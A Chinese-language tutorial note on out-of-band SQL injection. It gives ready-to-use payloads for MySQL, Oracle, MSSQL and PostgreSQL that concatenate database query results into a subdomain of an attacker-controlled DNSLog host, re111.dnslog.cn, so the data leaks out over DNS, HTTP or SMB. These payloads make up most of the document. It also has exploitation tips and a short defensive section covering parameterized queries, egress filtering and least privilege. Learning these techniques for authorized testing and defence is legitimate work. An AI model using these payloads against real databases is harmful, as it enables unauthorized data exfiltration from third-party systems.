# SQL 注入信息外带（OOB）

## 一句话理解
OOB（Out-of-Band）SQL 注入，是指在页面没有直接回显、报错和时间差都不稳定时，借助数据库自身的网络能力，把查询结果通过 DNS、HTTP、SMB 等带外通道送到攻击者可观察的位置。

## 适用场景
适合以下情况：
- 页面无直接回显
- 报错信息被抑制
- 时间盲注成本过高
- 目标数据库允许出网或能访问内网 DNS / HTTP / SMB 资源

## 核心思路
把查询结果拼进一个可控域名或 URL 中，诱导数据库发起：
- DNS 查询
- HTTP 请求
- SMB / UNC 路径访问

攻击者再在 DNSLog、HTTPLog 或自建服务端接收这些请求，从而间接拿到数据。

## 前期准备
需要一个你可控的带外接收点，例如：
1. DNSLog 平台：[dnslog.cn](http://www.dnslog.cn/)
2. 自建 DNS 服务器和域名

示例中 `re111.dnslog.cn` 为攻击者可控的三级域名。

## 常见前提
- 数据库具备相关网络函数或文件访问能力
- 注入点至少支持一定程度的表达式执行
- 目标环境允许目标协议出站
- 需要时具备联合注入、堆叠注入或高权限函数调用条件

## 各数据库利用思路
### 1. MySQL
#### 条件
- 常见于 Windows 环境
- `secure_file_priv` 不能卡死相关利用路径
- 通常适用于联合注入或堆叠注入

#### 思路
利用 `load_file()` 结合 Windows UNC 路径，让目标去解析攻击者域名：

```sql
select load_file(concat("\\\\",version(),".re111.dnslog.cn//1ndex.txt"));
```

实战要点：
- 依赖 Windows UNC 路径行为
- 依赖目标主机能发起相应名称解析或 SMB 访问

### 2. Oracle
#### 条件
- 常见于联合注入或堆叠注入
- 对相关网络包和函数的执行权限要求较高

#### 常见函数
`UTL_HTTP.REQUEST()`：

```sql
SELECT UTL_HTTP.REQUEST((SELECT * from v$version)||'.re111.dnslog.cn') FROM sys.DUAL;
```

`DBMS_LDAP.INIT()`：

```sql
SELECT DBMS_LDAP.INIT((SELECT * from v$version)||'.re111.dnslog.cn',80) FROM sys.DUAL;
```

`HTTPURITYPE()`：

```sql
SELECT HTTPURITYPE((SELECT * from v$version)||'.re111.dnslog.cn').GETCLOB() FROM sys.DUAL;
```

`UTL_INADDR.GET_HOST_ADDRESS()`：

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT * from v$version)||'.re111.dnslog.cn') FROM sys.DUAL;
```

> 原文这里 `UTL_INADDR.GET_HOST_ADDRESS()` 的示例与 `HTTPURITYPE()` 重复，我已按函数名补成更一致的形式。

### 3. MSSQL
#### 条件
- 常见于 Windows 环境
- 适用于联合注入或堆叠注入

#### 思路
原理与 MySQL 利用 UNC 路径较接近，借助系统过程访问远程共享路径，带出 DNS 请求：

`xp_dirtree`：

```sql
d=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');
```

`xp_fileexist`：

```sql
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_fileexist "\\'+@host+'\foobar$"');
```

`xp_subdirs`：

```sql
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))+'.re111.dnslog.cn'; EXEC('master..xp_subdirs "\\'+@host+'\foobar$"');
```

### 4. PostgreSQL
#### 条件
- 常见于 Windows 环境
- 通常需要堆叠注入

#### 思路 1：利用 `COPY`

```sql
id=1;DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (select version()); exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.re111.dnslog.cn\\\\aaa.txt\''; EXECUTE exec_cmd; END; $$ LANGUAGE plpgSQL SECURITY DEFINER; SELECT temp_function();
```

#### 思路 2：开启 `dblink`

```sql
id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'.re111.dnslog.cn username=1ndex password=1ndex','SELECT 1ndex') RETURNS (result TEXT);
```

## 实战注意点
### 1. OOB 不等于稳定回显
它更像一种“带外确认”和“低频数据外带”方式，不适合高吞吐盲注枚举所有内容。

### 2. DNS 标签长度有限
把数据拼进子域名时，需要考虑：
- 单段长度限制
- 特殊字符编码
- 结果裁剪

### 3. 权限与网络环境决定成败
不是数据库支持某函数就一定能打通，还要看：
- 是否有执行权限
- 是否允许出网
- 是否被防火墙、DNS 策略或代理拦截

## 防御要点
### 1. 根本防御仍是参数化查询
OOB 只是 SQL 注入的一种利用方式，不是单独漏洞。

### 2. 限制数据库外连能力
从网络层限制数据库主机：
- DNS 出站
- HTTP 出站
- SMB / UNC 访问

### 3. 关闭高危网络函数和扩展
尤其是 Oracle、MSSQL、PostgreSQL 中与网络、文件系统、外部连接相关的功能。

### 4. 最小权限
应用数据库账户不应拥有调用高危包、扩展或系统过程的能力。

## 速查清单
- 无回显时优先考虑 OOB 是否可行
- 先判断数据库类型，再选对应的网络函数或 UNC 路径利用
- 先验证 DNSLog / HTTPLog 是否能收到请求
- 评估权限、出网和协议支持，不盲目套 payload
- OOB 更适合确认利用和外带关键数据，不适合大规模慢速枚举

## Reference
- https://www.cnblogs.com/wjrblogs/p/14367387.html
